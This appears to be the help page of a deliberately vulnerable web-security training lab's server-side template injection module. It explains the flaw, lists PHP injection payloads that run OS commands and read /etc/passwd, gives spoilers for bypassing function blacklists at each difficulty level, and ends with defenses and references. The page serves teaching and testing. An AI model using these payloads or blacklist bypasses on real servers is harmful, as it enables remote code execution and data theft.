<div class="body_padded">
	<h1>Help - Server-Side Template Injection (SSTI)</h1>

	<div id="code">
		<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
			<tr>
				<td><div id="code">
					<h3>About</h3>
					<p>Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is embedded into a template in an unsafe manner, allowing an attacker to inject template directives and potentially execute arbitrary code on the server.</p>
					
					<p>In this module, SSTI occurs when user input replaces template placeholders (like {{name}}) and the resulting template is evaluated as PHP code using eval(). This allows attackers to break out of the template context and inject malicious code.</p>

					<h3>How SSTI Works</h3>
					<p>Template engines use special syntax to:</p>
					<ul>
						<li>Display variables: <code>{{username}}</code> or <code>${username}</code></li>
						<li>Execute expressions: <code>{{7*7}}</code></li>
						<li>Call functions: <code>{{system('whoami')}}</code></li>
						<li>Access objects: <code>{{_self}}</code> in Twig</li>
					</ul>
					<p>When user input replaces template variables and is then evaluated unsafely (e.g., with eval()), attackers can inject PHP code by breaking out of the string context.</p>

					<h3>Common Template Engines</h3>
					<ul>
						<li><strong>PHP:</strong> Twig, Smarty, Blade</li>
						<li><strong>Python:</strong> Jinja2, Mako, Tornado</li>
						<li><strong>Java:</strong> FreeMarker, Velocity, Thymeleaf</li>
						<li><strong>JavaScript:</strong> Pug (Jade), Handlebars, EJS</li>
						<li><strong>Ruby:</strong> ERB, Slim, Haml</li>
					</ul>

					<h3>SSTI Payloads</h3>
					<p><strong>Detection (Breaking out of string context):</strong></p>
					<pre>' . phpinfo() . '         # Break string and execute phpinfo
' . 7*7 . '                # Test expression evaluation
<?php phpinfo(); ?>       # Direct PHP tag injection</pre>

					<p><strong>PHP Code Injection via SSTI:</strong></p>
					<pre>' . system('whoami') . '       # Execute OS commands
' . `whoami` . '               # Backticks command execution
' . file_get_contents('/etc/passwd') . '  # Read files
' . print_r(scandir('.')) . '  # List directory</pre>

					<p><strong>Advanced Exploitation:</strong></p>
					<pre>' . shell_exec('ls -la') . '   # Shell execution
'; system('cat /etc/passwd'); $x=' # Multiple statements
<?php echo `id`; ?>          # PHP tags with backticks</pre>

					<h3>Impact</h3>
					<ul>
						<li><strong>Remote Code Execution (RCE):</strong> Execute arbitrary commands on the server</li>
						<li><strong>File System Access:</strong> Read/write sensitive files</li>
						<li><strong>Information Disclosure:</strong> Access configuration, environment variables</li>
						<li><strong>Privilege Escalation:</strong> Access internal functions and objects</li>
						<li><strong>Server Takeover:</strong> Complete compromise of the server</li>
					</ul>

					<br /><hr /><br />

					<h3>Objective</h3>
					<p>Your goal is to exploit the SSTI vulnerability to:</p>
					<ul>
						<li><strong>Low:</strong> Inject PHP code by breaking out of template string</li>
						<li><strong>Medium:</strong> Bypass function name blacklist</li>
						<li><strong>High:</strong> Bypass template syntax detection and extensive blacklist</li>
						<li><strong>Impossible:</strong> Understand proper SSTI prevention</li>
					</ul>

					<br /><hr /><br />

					<h3>Low Level</h3>
					<p>The low level replaces {{name}} placeholder with user input and evaluates the result as PHP code using eval().</p>
					<p><em>Spoiler:</em> <span class="spoiler">Break out of the string context using quotes and inject PHP code. Try: ' . phpinfo() . ' or ' . system('whoami') . ' or <?php echo `id`; ?></span></p>

					<br />

					<h3>Medium Level</h3>
					<p>The medium level implements a basic blacklist blocking: eval, exec, system, passthru, shell_exec, phpinfo, popen, proc_open, and PHP tags.</p>
					<p><em>Spoiler:</em> <span class="spoiler">Blacklist blocks some functions but not all. Try backticks: ' . `whoami` . ' or file functions: ' . file_get_contents("/etc/passwd") . ' or ' . print_r(scandir(".")) . '</span></p>

					<br />

					<h3>High Level</h3>
					<p>The high level blocks explicit template syntax ({{...}}) in user input and implements extensive blacklist including file operations, superglobals, and encoding functions.</p>
					<p><em>Spoiler:</em> <span class="spoiler">Template syntax like {{}} is blocked, but you can still break the string. The template structure is: $user = '{{name}}'. Try: '; echo `whoami`; $x=' or use string concatenation: ' . `id` . ' (note: backticks and basic functions may still work if not in blacklist)</span></p>

					<br />

					<h3>Impossible Level</h3>
					<p>The impossible level properly prevents SSTI by:</p>
					<ul>
						<li>Using CSRF token protection</li>
						<li><strong>Never using eval() or dynamic code execution</strong></li>
						<li>Using str_replace() for static template placeholders</li>
						<li>Properly escaping all output with htmlspecialchars()</li>
						<li>Validating input with strict whitelist regex</li>
						<li>Using placeholder syntax that cannot be confused with code</li>
					</ul>
					<p>This is the recommended approach for safe template handling.</p>

					<br />

					<h3>Defense Strategies</h3>
					<ul>
						<li><strong>Never use eval():</strong> Never evaluate user input as code</li>
						<li><strong>Use sandboxed mode:</strong> Enable sandbox mode in template engines (e.g., Twig sandbox)</li>
						<li><strong>Logic-less templates:</strong> Use logic-less template engines when possible (Mustache)</li>
						<li><strong>Input validation:</strong> Strictly validate all user input</li>
						<li><strong>Output encoding:</strong> Always escape output properly</li>
						<li><strong>Avoid string concatenation:</strong> Don't concatenate user input into templates</li>
						<li><strong>Use parameterized templates:</strong> Pass user data as template parameters, not inline</li>
						<li><strong>Keep engines updated:</strong> Update template engines to latest versions</li>
						<li><strong>Security audits:</strong> Regular code review for template usage</li>
					</ul>

					<br />

					<h3>Testing Tips</h3>
					<ul>
						<li><strong>Detect:</strong> Try breaking string context: ' . phpinfo() . '</li>
						<li><strong>String concatenation:</strong> Use ' . expression . ' to inject code</li>
						<li><strong>Semicolon chains:</strong> '; expression; $x=' to execute multiple statements</li>
						<li><strong>PHP tags:</strong> <?php code ?> if allowed</li>
						<li><strong>Backticks:</strong> ' . `command` . ' for command execution</li>
						<li><strong>Function discovery:</strong> ' . print_r(get_defined_functions()) . '</li>
						<li><strong>Error messages:</strong> Trigger errors to reveal template structure</li>
						<li><strong>Encoding:</strong> Try base64, URL encoding if not blacklisted</li>
					</ul>

					<br />

					<h3>Real-world Examples</h3>
					<ul>
						<li><strong>Uber (2016):</strong> Jinja2 SSTI leading to RCE</li>
						<li><strong>Shopify (2017):</strong> ERB template injection</li>
						<li><strong>Atlassian (2019):</strong> Velocity template injection</li>
					</ul>

					<br />

					<h3>References</h3>
					<ul>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection', 'OWASP - SSTI Testing Guide' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/research/server-side-template-injection', 'PortSwigger - SSTI Research' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/web-security/server-side-template-injection', 'PortSwigger - SSTI' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection', 'HackTricks - SSTI' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection', 'PayloadsAllTheThings - SSTI' ); ?></li>
					</ul>
				</div></td>
			</tr>
		</table>
	</div>
</div>
